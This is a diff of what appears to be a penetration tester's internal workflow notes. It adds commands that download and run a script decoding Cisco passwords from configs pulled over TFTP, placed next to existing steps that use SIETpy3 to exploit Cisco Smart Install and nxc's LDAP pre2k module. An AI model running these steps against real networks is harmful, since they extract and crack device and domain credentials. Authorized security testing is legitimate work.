@@ -43,6 +43,10 @@ git clone https://github.com/Sab0tag3d/SIETpy3.git
 
 python3 siet.py -l ../cisco-smart-install.txt -g 
 
+wget https://github.com/patrick-projects/Internal-Workflow/blob/main/cisco_decode_passwds.py
+
+python3 cisco_decode_passwds.py tftp/
+
 ------ Low-Priv Credentials -------
 
 nxc ldap -u username -p password -M pre2k
